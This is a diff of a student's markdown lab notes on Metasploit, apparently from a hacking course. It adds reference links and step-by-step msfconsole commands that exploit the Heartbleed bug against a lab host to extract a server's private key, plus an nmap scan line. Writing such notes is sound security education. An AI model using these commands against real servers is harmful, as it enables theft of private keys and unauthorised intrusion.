@@ -1,15 +1,14 @@
-#Metasploit
-
+# Metasploit
 
 metasploit can be used to: 
 - create trojan horses
 - run attacks
 
-
-https://docs.metasploit.com
-
-
-https://www.youtube.com/watch?v=oBAC5UfalC8
+Links
+- https://docs.metasploit.com
+- https://www.youtube.com/watch?v=oBAC5UfalC8
+- https://docs.rapid7.com/metasploit/metasploitable-2-exploitability-guide/
+- https://www.hackingarticles.in/comprehensive-guide-on-metasploitable-2/
 
 
 ### Example attack: Remote shell via IRC vulnerability 
@@ -41,7 +40,29 @@ From the Nessus scan i know that iloveshells.vm.vuln.land has a critical vulnera
 
 (taken from video: https://www.youtube.com/watch?v=oBAC5UfalC8   )
 
+### Exploit Heartbleed bug
+1. start metasploit resource (exercise 2) and log in
+2. Execute the commands
+    - `msfconsole` > start metasploit
+    - `use auxiliary/scanner/ssl/openssl_heartbleed` 
+    - `set action KEYS`
+    - `set RHOST heartbleed.vm.vuln.land` 
+    - `set MAX_KEYTRIES 255` (as explained.. above 250 makes no sense)
+    - `exploit`
+
+Success: attack succeded. Private key starts with "MIICW"  (see screenshot)
+
+
+### Further examples
+- Postgres -> see solutions "Gaining Access/Metasploitable MV"
+- Brute-force / Login SSH -> see solutions "Gaining Access/Metasploitable MV"
+- Java RMI -> see solutions "Gaining Access/Metasploitable MV"
+
 
 ### Varia/Leftovers
 
-Heartbleed bug: metasploit is less reliable than "Heartleech" -> so dont use Metasploit for this
+- Heartbleed bug: There is another tool "Heartleech" to exploit the heartbleed vulnerabilitiy, which should be more reliable. However, I only succeded with metasploit
+- check lab task "Gaining Access/Metasploitable MV"
+- To find vulnerabilities we could use: 
+    - Nessus (more advanced)
+    - NMAP: `nmap -p -sV iloveshells.vm.vuln.land`(would show open ports + versions)
